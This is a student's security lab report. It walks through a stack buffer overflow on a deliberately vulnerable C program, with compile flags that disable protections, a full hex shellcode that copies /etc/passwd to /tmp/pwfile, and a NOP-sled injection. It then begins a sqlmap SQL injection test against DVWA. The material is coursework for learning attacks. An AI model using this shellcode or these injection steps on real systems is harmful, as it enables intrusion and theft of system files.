# Lab #1,22110090, NGUYEN DUC VINH, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
 **Question 1**: 
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:

**Answer 1**:
## 1. Compile the Shellcode (Assembly) Progra
First, we need to compile the assembly program containing the shellcode that copies `/etc/passwd` to `/tmp/pwfile`.

```sh
nasm -f elf32 shellcode.asm -o shellcode.o
ld -m elf_i386 -o shellcode shellcode.o
```
<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/7d3089e1-e178-4604-ae73-258361af71df"><br>


## 2.  Compile the Vulnerable C Program

We then compile the vulnerable C program without stack protection and with executable stack, so it can be exploited using the shellcode.
```sh
gcc -fno-stack-protector -z execstack -o vulnerable vulnerable.c
``` 
<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/b63672c5-b441-40fd-a50a-7de39a259b55"><br>
Running the program without any arguments will not do anything because it relies on the user input for the buffer overflow. We will handle this in the next steps.

-`fno-stack-protector`: Disables stack protection, making buffer overflow easier.
-`z execstack`: Allows code execution from the stack, which is necessary for running the injected shellcode.

## 3. Prepare Shellcode for Injection

we need to extract the shellcode bytes from the compiled assembly program to inject into the C program. This is done using `objdump` to extract the opcode.

```sh
objdump -d shellcode | grep '[0-9a-f]:' | grep -v 'file' | cut -f2- | tr -s ' ' | cut -d ' ' -f2-7 | sed 's/ /\\x/g' | paste -d '' -s

```
This command will provide the shellcode in the form \x... that can be injected into the vulnerable C program.

This will produce shellcode in the format:

<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/9f51333a-d143-472a-baa8-e16134147516"><br>
```sh
print('\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80' + 'A' * 20 + '\x30\xd6\xff\xff')"
```


You now have the raw shellcode that can be injected into the C program.

## 4. Exploit the Vulnerable C Program

We will now execute the vulnerable C program with an environment variable containing the shellcode, to exploit the buffer overflow and inject the shellcode into the execution path.

Export the shellcode into an environment variable:

```sh
export SHELLCODE=$(python -c 'print("\x90"*100 + "\x..." + "\x90"*20)')
```
The `\x90` represents NOPs (No Operation), which create a NOP sled to increase the likelihood that the CPU will jump into our shellcode during the overflow.
```sh
./vulnerable $(python -c 'print("A"*20 + "\x12\x34\x56\x78")')
```
In this example, `"A"*20` represents padding, and `"\x12\x34\x56\x78"` would be replaced by the address pointing to the NOP sled.<br>
When the buffer overflow occurs, the program's return address will be overwritten with the address pointing to our shellcode. As a result, the injected shellcode will execute, copying `/etc/passwd` to `/tmp/pwfile`.

If successful, there will be no visible output on the terminal. You can verify the success of the exploit by checking the contents of /`tmp/pwfile`.
## 5. Verify the Attack:
After running the program, the `/etc/passwd` file should be copied to `/tmp/pwfile`. We can verify it using the following command:
```sh
cat /tmp/pwfile
```
After running the vulnerable program, check if the shellcode was executed successfully.
<img width="500" alt="Screenshot" src=https://github.com/user-attachments/assets/486507f2-fe1f-49b4-812b-248cb4d6c1e0><br>

The file `/tmp/pwfile` should now exist, and you can view its contents:
<img width="500" alt="Screenshot" src=https://github.com/user-attachments/assets/92493e56-f25a-4cae-8afe-e518cc5ebd47><br>

The contents of /`etc/passwd` will be displayed, confirming that the exploit worked and the file was copied successfully.
<img width="500" alt="Screenshot" src=https://github.com/user-attachments/assets/24200c0e-cd65-4a9c-92e8-64abc1db05ca><br>


**Conclusion**: By executing these steps, we exploited a buffer overflow vulnerability in the C program and successfully injected shellcode that copied the `/etc/passwd` file to `/tmp/pwfile`.

# Task 2: Attack on database of DVWA
**Question 2**: Use sqlmap to get tables, users information

## 1. Identify the Target URL
First, identify a URL or form in the web application that is vulnerable to SQL injection. For example:

```sh
http://example.com/vulnerable.php?id=1

```
This URL passes a parameter `id=1` to the server. We will use `sqlmap` to test if this parameter is vulnerable to SQL injection.


## 2.  Basic SQL Injection Test

Run the following command to test if the target URL is vulnerable to SQL injection:
```sh
sqlmap -u "http://example.com/vulnerable.php?id=1"

``` 
Expected Output:
sqlmap will run a series of tests to check for SQL injection vulnerabilities. If the site is vulnerable, you will see a message like:
<img width="500" alt="Screenshot" src="https://github.com/user-attachments/assets/f75d73c9-8dbd-4b53-8e24-955d4bf0d0b8"><br>
